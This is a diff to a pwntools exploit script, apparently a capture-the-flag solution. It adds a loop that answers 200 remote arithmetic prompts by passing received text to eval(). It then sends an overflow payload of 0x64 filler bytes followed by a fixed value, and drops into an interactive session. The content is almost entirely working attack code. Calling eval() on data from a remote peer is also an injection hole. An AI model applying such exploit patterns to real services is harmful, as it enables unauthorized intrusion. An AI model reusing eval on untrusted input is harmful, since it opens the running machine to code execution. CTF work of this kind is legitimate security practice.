@@ -32,7 +32,6 @@ parser.add_argument('-p',type=int,help='remote port',metavar='RPORT')
 parser.add_argument('-l',help='libc - [xx] for v2.xx, or [/path/to/libc.so.6] to load a specific libc',default='23',metavar='LIBC')
 parser.add_argument('-d',help='disable DEBUG mode',action='store_true')
 args = parser.parse_args()
-print(args)
 
 binary = args.b
 context.binary = binary
@@ -76,7 +75,11 @@ def show(index):
 	sla(':',index)
 
 # start
+for i in range(200):
+	ru('Math: ')
+	sla('answer:',eval(ru(' = ???')))
 
+sl(flat('a'*0x64,0x12235612))
 # end
 
 p.interactive()
